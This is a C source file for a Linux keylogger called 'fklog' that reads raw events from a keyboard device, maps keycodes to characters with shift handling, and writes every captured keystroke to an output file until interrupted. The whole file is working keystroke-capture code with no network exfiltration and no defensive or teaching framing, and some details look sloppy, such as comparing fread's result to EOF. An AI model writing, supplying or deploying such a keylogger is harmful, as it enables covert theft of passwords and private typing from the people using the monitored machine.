#include <getopt.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <string.h>

#include <linux/input-event-codes.h>
#include <linux/input.h>

#define AND     &&
#define OR      ||
#define IS      ==
#define ISNOT   !=
#define NOT     !
#define IF      
#define THEN    ?
#define ELSE    :

static char convert_unshifted_keypress(int Key);
static char convert_shifted_keypress(int Key);
static char convert_nonshiftable_keypress(int Key);

static bool shift_key(int Key);
static bool nonshiftable_key(int Key);

static void handle_sigint(int Sig);
static void print_err(const char *Message);
static void print_usage(void);

static const int  BUFSIZE       = 0x64;
static const char NEWLINE       = 0x0A;
static const char BACKSPACE_KEY = 0xAE;
static const char UNKNOWN_KEY   = 0xB2;

static volatile bool Interrupted = false;

static const struct option LongOptions[] = 
{
    {"outfile" , required_argument, NULL, 'f'},
    {"keyboard", required_argument, NULL, 'k'},
    {"help"    , no_argument      , NULL, 'h'},
    { NULL     , no_argument      , NULL,  0 },
};

int main(int Argc, char **Argv)
{
    char *OutfileName = NULL, *KeyboardName = NULL;
    FILE *Outfile = NULL,     *Keyboard = NULL;
    bool HelpFlag = false,    ShiftOn = false;
    char Ch = 0x00,           Keystrokes[BUFSIZE];
    int i = 0x00,             Status = EXIT_FAILURE;

    struct input_event Event;

    memset(&Keystrokes, 0x00, sizeof(Keystrokes));
    memset(&Event, 0x00, sizeof(Event));

    while ((Ch = getopt_long(Argc, Argv, "f:k:h", LongOptions, NULL)) ISNOT EOF)
    {
        switch (Ch)
        {
            case 'f':
            {
                OutfileName = strdup(optarg);
                break;
            }
            case 'k':
            {
                KeyboardName = strdup(optarg);
                break;
            }
            case 'h':
            {
                HelpFlag = true;
                break;
            }
            default:
            {
                print_usage();
                goto Error;
                break;
            }
        }
    }

    if (HelpFlag)
    {
        print_usage();
        Status = EXIT_SUCCESS;
        goto Success;
    }

    if (OutfileName IS NULL)
    {
        print_err("Outfile is a required argument");
        goto Error;
    }

    if (KeyboardName IS NULL)
    {
        print_err("Keyboard is a required argument");
        goto Error;
    }

    Keyboard = fopen(KeyboardName, "r");
    if (Keyboard IS NULL)
    {
        print_err("Could not open keyboard file");
        goto Error;
    }

    Outfile = fopen(OutfileName, "w");
    if (Outfile IS NULL)
    {
        print_err("Could not open output file");
        goto Error;
    }

    signal(SIGINT, handle_sigint);

    while (NOT Interrupted)
    {
        for (; NOT Interrupted AND i < BUFSIZE AND (fread(&Event, sizeof(Event), true, Keyboard) ISNOT EOF);)
        {
            if (Event.type IS EV_KEY)
            {
                if (shift_key(Event.code))
                {
                    ShiftOn = IF (Event.value) THEN true ELSE false;
                }
                else if (Event.value)
                {
                    Ch = IF (nonshiftable_key(Event.code)) THEN convert_nonshiftable_keypress(Event.code)
                         ELSE IF (ShiftOn) THEN convert_shifted_keypress(Event.code)
                         ELSE convert_unshifted_keypress(Event.code);

                    Keystrokes[i++] = Ch;
                }
            }
            else if (Event.type > EV_MAX)
            {
                print_err("Received invalid keyboard events");
                goto Error;
            }
        }

        fwrite(Keystrokes, sizeof(Keystrokes[0]), BUFSIZE, Outfile);
        i = 0;
    }

    fwrite(Keystrokes, sizeof(Keystrokes[0]), i, Outfile);
    fwrite(&NEWLINE, sizeof(NEWLINE), true, Outfile);
    fflush(Outfile);

    printf("%c", NEWLINE);
    Status = EXIT_SUCCESS;

Error:
    if (OutfileName ISNOT NULL)  free(OutfileName);
    if (KeyboardName ISNOT NULL) free(KeyboardName);
    if (Outfile ISNOT NULL)      fclose(Outfile);
    if (Keyboard ISNOT NULL)     fclose(Keyboard);

Success:
    return Status;
}

static char convert_unshifted_keypress(int Key)
{
    char Ch;
    switch (Key)
    {
        case KEY_1:          Ch = '1';         break;
        case KEY_2:          Ch = '2';         break;
        case KEY_3:          Ch = '3';         break;
        case KEY_4:          Ch = '4';         break;
        case KEY_5:          Ch = '5';         break;
        case KEY_6:          Ch = '6';         break;
        case KEY_7:          Ch = '7';         break;
        case KEY_8:          Ch = '8';         break;
        case KEY_9:          Ch = '9';         break;
        case KEY_0:          Ch = '0';         break;
        case KEY_MINUS:      Ch = '-';         break;
        case KEY_EQUAL:      Ch = '=';         break;
        case KEY_Q:          Ch = 'q';         break;
        case KEY_W:          Ch = 'w';         break;
        case KEY_E:          Ch = 'e';         break;
        case KEY_R:          Ch = 'r';         break;
        case KEY_T:          Ch = 't';         break;
        case KEY_Y:          Ch = 'y';         break;
        case KEY_U:          Ch = 'u';         break;
        case KEY_I:          Ch = 'i';         break;
        case KEY_O:          Ch = 'o';         break;
        case KEY_P:          Ch = 'p';         break;
        case KEY_LEFTBRACE:  Ch = '[';         break;
        case KEY_RIGHTBRACE: Ch = ']';         break;
        case KEY_A:          Ch = 'a';         break;
        case KEY_S:          Ch = 's';         break;
        case KEY_D:          Ch = 'd';         break;
        case KEY_F:          Ch = 'f';         break;
        case KEY_G:          Ch = 'g';         break;
        case KEY_H:          Ch = 'h';         break;
        case KEY_J:          Ch = 'j';         break;
        case KEY_K:          Ch = 'k';         break;
        case KEY_L:          Ch = 'l';         break;
        case KEY_SEMICOLON:  Ch = ';';         break;
        case KEY_APOSTROPHE: Ch = '\'';        break;
        case KEY_GRAVE:      Ch = '`';         break;
        case KEY_BACKSLASH:  Ch = '\\';        break;
        case KEY_Z:          Ch = 'z';         break;
        case KEY_X:          Ch = 'x';         break;
        case KEY_C:          Ch = 'c';         break;
        case KEY_V:          Ch = 'v';         break;
        case KEY_B:          Ch = 'b';         break;
        case KEY_N:          Ch = 'n';         break;
        case KEY_M:          Ch = 'm';         break;
        case KEY_COMMA:      Ch = ',';         break;
        case KEY_DOT:        Ch = '.';         break;
        case KEY_SLASH:      Ch = '/';         break;
        default:             Ch = UNKNOWN_KEY; break;
    }
    return Ch;
}

static char convert_shifted_keypress(int Key)
{
    char Ch;
    switch (Key)
    {
        case KEY_1:          Ch = '!';         break;
        case KEY_2:          Ch = '@';         break;
        case KEY_3:          Ch = '#';         break;
        case KEY_4:          Ch = '$';         break;
        case KEY_5:          Ch = '%';         break;
        case KEY_6:          Ch = '^';         break;
        case KEY_7:          Ch = '&';         break;
        case KEY_8:          Ch = '*';         break;
        case KEY_9:          Ch = '(';         break;
        case KEY_0:          Ch = ')';         break;
        case KEY_MINUS:      Ch = '_';         break;
        case KEY_EQUAL:      Ch = '+';         break;
        case KEY_Q:          Ch = 'Q';         break;
        case KEY_W:          Ch = 'W';         break;
        case KEY_E:          Ch = 'E';         break;
        case KEY_R:          Ch = 'R';         break;
        case KEY_T:          Ch = 'T';         break;
        case KEY_Y:          Ch = 'Y';         break;
        case KEY_U:          Ch = 'U';         break;
        case KEY_I:          Ch = 'I';         break;
        case KEY_O:          Ch = 'O';         break;
        case KEY_P:          Ch = 'P';         break;
        case KEY_LEFTBRACE:  Ch = '{';         break;
        case KEY_RIGHTBRACE: Ch = '}';         break;
        case KEY_A:          Ch = 'A';         break;
        case KEY_S:          Ch = 'S';         break;
        case KEY_D:          Ch = 'D';         break;
        case KEY_F:          Ch = 'F';         break;
        case KEY_G:          Ch = 'G';         break;
        case KEY_H:          Ch = 'H';         break;
        case KEY_J:          Ch = 'J';         break;
        case KEY_K:          Ch = 'K';         break;
        case KEY_L:          Ch = 'L';         break;
        case KEY_SEMICOLON:  Ch = ':';         break;
        case KEY_APOSTROPHE: Ch = '\"';        break;
        case KEY_GRAVE:      Ch = '~';         break;
        case KEY_BACKSLASH:  Ch = '|';         break;
        case KEY_Z:          Ch = 'Z';         break;
        case KEY_X:          Ch = 'X';         break;
        case KEY_C:          Ch = 'C';         break;
        case KEY_V:          Ch = 'V';         break;
        case KEY_B:          Ch = 'B';         break;
        case KEY_N:          Ch = 'N';         break;
        case KEY_M:          Ch = 'M';         break;
        case KEY_COMMA:      Ch = '<';         break;
        case KEY_DOT:        Ch = '>';         break;
        case KEY_SLASH:      Ch = '?';         break;
        default:             Ch = UNKNOWN_KEY; break;
    }
    return Ch;
}

static char convert_nonshiftable_keypress(const int Key)
{
    char Ch;
    switch (Key)
    {
        case KEY_BACKSPACE: Ch = BACKSPACE_KEY; break;
        case KEY_TAB:       Ch = '\t';          break;
        case KEY_ENTER:     Ch = NEWLINE;       break;
        case KEY_SPACE:     Ch = ' ';           break;
        default:            Ch = UNKNOWN_KEY;   break;
    }
    return Ch;
}

static bool shift_key(int Key)
{
    return Key IS KEY_LEFTSHIFT
        OR Key IS KEY_RIGHTSHIFT;
}

static bool nonshiftable_key(int Key)
{
    return Key IS KEY_BACKSPACE
        OR Key IS KEY_TAB
        OR Key IS KEY_ENTER
        OR Key IS KEY_SPACE;
}

static void handle_sigint(int Sig)
{
    Interrupted = true;
}

static void print_err(const char *Message)
{
    printf("[ERROR] %s%c", Message, NEWLINE);
}

static void print_usage(void)
{
    printf("[USAGE] fklog -f <output_file> -k <keyboard_path>%c", NEWLINE);
}
